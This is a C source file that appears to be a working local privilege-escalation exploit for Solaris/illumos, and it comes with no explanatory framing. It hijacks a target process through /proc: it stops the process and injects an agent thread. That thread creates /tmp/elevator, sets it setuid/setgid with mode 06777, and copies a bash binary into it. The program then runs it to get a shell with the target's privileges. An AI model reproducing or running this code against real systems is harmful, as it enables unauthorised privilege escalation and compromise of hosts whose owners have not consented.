#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <procfs.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <errno.h>
#include <unistd.h>
#include <dirent.h>
#define       T_SYSCALLINT    0x91
#define PSTACK_ALIGN32(sp)      ((sp) & ~(2 * sizeof (int64_t) - 1))

static uchar_t syscall_instr[] = { 0x0f, 0x05 };
static uchar_t int_syscall_instr[] = { 0xCD, T_SYSCALLINT };

int check(int r, char* msg) {
  if (!r) {
    perror(msg);
    exit(1);
  }
}
#define	BLKSIZE	(8 * 1024)

char* read_file(char* name, size_t* file_size) {
  FILE *f = fopen(name, "rb");
  fseek(f, 0, SEEK_END);
  long fsize = ftell(f);
  fseek(f, 0, SEEK_SET);

  char *string = malloc(fsize);
  fread(string, fsize, 1, f);
  fclose(f);

  *file_size = fsize;
  return string;
}
int
Pissyscall(int asfd, uintptr_t addr)
{
	uchar_t instr[16];

	if (pread(asfd, instr, sizeof (int_syscall_instr), addr) !=
	    sizeof (int_syscall_instr))
		return (0);

	if (memcmp(instr, int_syscall_instr, sizeof (int_syscall_instr)) == 0)
		return (1);

	return (0);
}

int
Pissyscall_prev(int asfd, uintptr_t addr, uintptr_t *dst)
{
	int ret;

	if (ret = Pissyscall(asfd, addr - sizeof (int_syscall_instr))) {
		if (dst)
			*dst = addr - sizeof (int_syscall_instr);
		return (ret);
	}

	return (0);
}

int
Pissyscall_text(const void *buf, size_t buflen)
{
        if (buflen < sizeof (int_syscall_instr))
                return (0);

        if (memcmp(buf, int_syscall_instr, sizeof (int_syscall_instr)) == 0)
                return (1);

        return (0);
}

/*
 * Look for a SYSCALL instruction in the process's address space.
 */
uintptr_t
Pscantext(lwpstatus_t* pr_lwp, pstatus_t* status, int asfd, char* pid)
{
	char mapfile[PATH_MAX];
	int mapfd;
	off_t offset;		/* offset in text section */
	off_t endoff;		/* ending offset in text section */
	uintptr_t sysaddr;	/* address of SYSCALL instruction */
	int syspri;		/* priority of SYSCALL instruction */
	int nbytes;		/* number of bytes in buffer */
	int n2bytes;		/* number of bytes in second buffer */
	int nmappings;		/* current number of mappings */
	prmap_t *pdp;		/* pointer to map descriptor */
	prmap_t *prbuf;		/* buffer for map descriptors */
	unsigned nmap;		/* number of map descriptors */
	uint32_t buf[2 * BLKSIZE / sizeof (uint32_t)];	/* text buffer */
	uchar_t *p;

	/* try the most recently-seen syscall address */
	syspri = 0;
	sysaddr = 0;



	/* try the previous instruction */
	if (sysaddr == 0 || syspri != 1)
		syspri = Pissyscall_prev(asfd, pr_lwp->pr_reg[R_PC],
		    &sysaddr);

	if (sysaddr != 0 && syspri == 1) {
		return sysaddr;
	}

	/* open the /proc/<pid>/map file */
	(void) snprintf(mapfile, sizeof (mapfile), "/proc/%s/map", pid);
	if ((mapfd = open(mapfile, O_CREAT|O_APPEND|O_RDONLY)) < 0) {
		printf("failed to open %s: %s\n", mapfile, strerror(errno));
		return 0;
	}

	/* allocate a plausible initial buffer size */
	nmap = 50;

	/* read all the map structures, allocating more space as needed */
	for (;;) {
		prbuf = malloc(nmap * sizeof (prmap_t));
		if (prbuf == NULL) {
			printf("Pscantext: failed to allocate buffer\n");
			(void) close(mapfd);
			return 0;
		}
		nmappings = pread(mapfd, prbuf, nmap * sizeof (prmap_t), 0L);
		if (nmappings < 0) {
			printf("Pscantext: failed to read map file: %s\n",
			    strerror(errno));
			free(prbuf);
			(void) close(mapfd);
			return 0;
		}
		nmappings /= sizeof (prmap_t);
		if (nmappings < nmap)	/* we read them all */
			break;
		/* allocate a bigger buffer */
		free(prbuf);
		nmap *= 2;
	}
	(void) close(mapfd);

	/*
	 * Scan each executable mapping looking for a syscall instruction.
	 * In dynamically linked executables, syscall instructions are
	 * typically only found in shared libraries.  Because shared libraries
	 * are most often mapped at the top of the address space, we minimize
	 * our expected search time by starting at the last mapping and working
	 * our way down to the first mapping.
	 */
	for (pdp = &prbuf[nmappings - 1]; sysaddr == 0 && syspri != 1 &&
	    pdp >= prbuf; pdp--) {

		offset = (off_t)pdp->pr_vaddr;	/* beginning of text */
		endoff = offset + pdp->pr_size;

		/* avoid non-EXEC mappings; avoid the stack and heap */
		if ((pdp->pr_mflags&MA_EXEC) == 0 ||
		    (endoff > status->pr_stkbase &&
		    offset < status->pr_stkbase + status->pr_stksize) ||
		    (endoff > status->pr_brkbase &&
		    offset < status->pr_brkbase + status->pr_brksize))
			continue;

		(void) lseek(asfd, (off_t)offset, 0);

		if ((nbytes = read(asfd, buf, 2*BLKSIZE)) <= 0)
			continue;

		if (nbytes < BLKSIZE)
			n2bytes = 0;
		else {
			n2bytes = nbytes - BLKSIZE;
			nbytes  = BLKSIZE;
		}

		p = (uchar_t *)buf;

		/* search text for a SYSCALL instruction */
		while (sysaddr == 0 && syspri != 1 && offset < endoff) {
			if (nbytes <= 0) {	/* shift buffers */
				if ((nbytes = n2bytes) <= 0)
					break;
				(void) memcpy(buf,
					&buf[BLKSIZE / sizeof (buf[0])],
					nbytes);
				n2bytes = 0;
				p = (uchar_t *)buf;
				if (nbytes == BLKSIZE &&
				    offset + BLKSIZE < endoff)
					n2bytes = read(asfd,
						&buf[BLKSIZE / sizeof (buf[0])],
						BLKSIZE);
			}

			if (syspri = Pissyscall_text(p, nbytes))
				sysaddr = offset;

			p += sizeof (instr_t);
			offset += sizeof (instr_t);
			nbytes -= sizeof (instr_t);
		}
	}

	free(prbuf);
        return sysaddr;
}

void write_control_with_arg(int fd, unsigned long ctl, unsigned long arg) {

  unsigned long data[2];
  data[0] = ctl;
  data[1] = arg;

  int wr = write(fd, &data, sizeof(data));
  check(wr == sizeof(data), "write control with arg");
}

void write_control_with_data(int fd, char* data, size_t size) {
  int wr = write(fd, data, size);
  check(wr == size, "write control with data");
}

void write_control(int fd, unsigned long ctl) {
  int wr = write(fd, &ctl, sizeof(ctl));
  check(wr == sizeof(ctl), "write");
}

void make_elevator(char* pid) {

  char as_file[256];
  snprintf(as_file, sizeof(as_file), "/proc/%s/as", pid);

  int asfd = open(as_file, O_CREAT|O_APPEND|O_RDWR);
  check(asfd >= 0, "open asfd");


  char path[256];

  snprintf(path, sizeof(path), "/proc/%s/ctl", pid);

  int fd = open(path, O_CREAT| O_APPEND| O_WRONLY);
  check(fd >= 0, "open");

  write_control(fd, PCSTOP);
  write_control_with_arg(fd, PCSET, PR_RLC);

  snprintf(path, sizeof(path), "/proc/%s/lwp/1/lwpstatus", pid);
  int status_fd = open(path, O_CREAT | O_APPEND | O_RDWR);
  check(status_fd >= 0, "open");

  lwpstatus_t status;
  pstatus_t proc_status;

  int rd = read(status_fd, &status, sizeof(status));
  check(rd == sizeof(status), "read");

  snprintf(path, sizeof(path), "/proc/%s/status", pid);
  int proc_status_fd = open(path, O_CREAT | O_APPEND | O_RDWR);
  check(proc_status_fd >= 0, "open");

  rd = read(proc_status_fd, &proc_status, sizeof(proc_status));
  check(rd == sizeof(proc_status), "read");

  uintptr_t syscall = Pscantext(&status, &proc_status, asfd, pid);
  printf("found syscall: %lx\n", syscall);
  struct {
    unsigned long cmd;
    prgregset_t regs;
  } agent_command;


  agent_command.cmd = PCAGENT;
  memcpy(agent_command.regs, status.pr_reg, sizeof(status.pr_reg));

  prgreg_t aligned_sp = PSTACK_ALIGN32(agent_command.regs[REG_RSP]) - 1024; /* eughh..there is something off with this code and this offset fixes it :/ */

  char* filename = "/tmp/elevator";

  prgreg_t sp = aligned_sp - PSTACK_ALIGN32(strlen(filename) + 1);

  int wr = pwrite(asfd, filename, strlen(filename) + 1, sp);
  check(wr == strlen(filename) + 1, "write args");

  agent_command.regs[REG_RAX] = SYS_openat;

  agent_command.regs[REG_RSP] = sp - sizeof(int32_t) * (2 + 4);
  agent_command.regs[REG_RIP] = syscall;


  uint32_t args[4 + 1];
  args[0] = agent_command.regs[REG_RIP];
  args[1] = AT_FDCWD;
  args[2] = sp;
  args[3] = O_CREAT | O_WRONLY;
  args[4] = 06777;
  wr = pwrite(asfd, args, sizeof(args), agent_command.regs[REG_RSP]);
  check(wr == sizeof(args), "write args");


  write_control_with_data(fd, (char*)&agent_command, sizeof(agent_command));

  snprintf(path, sizeof(path), "/proc/%s/lwp/agent/lwpctl", pid);

  int agent_fd = open(path, O_CREAT| O_APPEND| O_WRONLY);
  check(agent_fd >= 0, "open agent");


  struct {
    unsigned long cmd;
    sysset_t set;
  } pcsexit_command;

  pcsexit_command.cmd = PCSEXIT;
  premptyset(&pcsexit_command.set);
  praddset(&pcsexit_command.set, SYS_openat);
  praddset(&pcsexit_command.set, SYS_chmod);
  praddset(&pcsexit_command.set, SYS_write);
  praddset(&pcsexit_command.set, SYS_lwp_exit);

  write_control_with_data(agent_fd, (char*)&pcsexit_command, sizeof(pcsexit_command));


  write_control_with_arg(agent_fd, PCRUN, 0);
  write_control(agent_fd, PCWSTOP);

  int inside_agent_fd;

  rd = pread(proc_status_fd, &proc_status, sizeof(proc_status), 0);
  check(rd == sizeof(proc_status), "read");

  inside_agent_fd = proc_status.pr_lwp.pr_rval1;

  agent_command.regs[REG_RAX] = SYS_chmod;
  agent_command.regs[REG_RSP] = sp - sizeof(int32_t) * (2 + 2);
  agent_command.regs[REG_RIP] = syscall;

  args[0] = agent_command.regs[REG_RIP];
  args[1] = sp;
  args[2] = 06777;
  wr = pwrite(asfd, args, sizeof(uint32_t) * 3, agent_command.regs[REG_RSP]);
  check(wr == sizeof(uint32_t) * 3, "write args");

  agent_command.cmd = PCSREG;

  write_control_with_data(agent_fd, (char*)&agent_command, sizeof(agent_command));
  write_control_with_arg(agent_fd, PCRUN, 0);
  write_control(agent_fd, PCWSTOP);


  size_t file_size;
  char* file_buffer = read_file("bash", &file_size);



  sp = aligned_sp - PSTACK_ALIGN32(file_size);

  printf("file_size: %d %lx\n", file_size, sp);
  wr = pwrite(asfd, file_buffer, file_size, sp);
  check(wr == file_size, "write file");

  agent_command.regs[REG_RAX] = SYS_write;
  agent_command.regs[REG_RSP] = sp - sizeof(int32_t) * (2 + 3);
  agent_command.regs[REG_RIP] = syscall;

  args[0] = agent_command.regs[REG_RIP];
  args[1] = inside_agent_fd;
  args[2] = sp;
  args[3] = file_size;
  wr = pwrite(asfd, args, sizeof(uint32_t) * 4, agent_command.regs[REG_RSP]);
  check(wr == sizeof(uint32_t) * 4, "write args for write()");

  write_control_with_data(agent_fd, (char*)&agent_command, sizeof(agent_command));
  write_control_with_arg(agent_fd, PCRUN, 0);
  write_control(agent_fd, PCWSTOP);

  rd = pread(proc_status_fd, &proc_status, sizeof(proc_status), 0);
  check(rd == sizeof(proc_status), "read");

  printf("write returned: %d\n",  proc_status.pr_lwp.pr_rval1);

  agent_command.regs[REG_RAX] = SYS_lwp_exit;
  agent_command.regs[REG_RSP] = sp - sizeof(int32_t) * 2;
  agent_command.regs[REG_RIP] = syscall;

  write_control_with_data(agent_fd, (char*)&agent_command, sizeof(agent_command));
  write_control_with_arg(agent_fd, PCRUN, 0);

  close(agent_fd);
  close(asfd);
  close(status_fd);
  close(proc_status_fd);
  close(fd);


}

void copy(char* src, char* dst) {
  int fd_src = open(src, O_RDONLY);
  int fd_dst = open(dst, O_WRONLY);

  char buf[1024];

  int rd;
  do {
    rd = read(fd_src, buf, 1024);
    check(rd >= 0, "copy read");
    if (rd > 0) {
      int wr = write(fd_dst, buf, rd);
      check(wr == rd, "copy write");
    }

  } while (rd > 0);

}

int main(int argc, char** argv) {
  make_elevator(argv[1]);
  char* args[] = {"/tmp/elevator", 0};

  execv("/tmp/elevator", args);
}
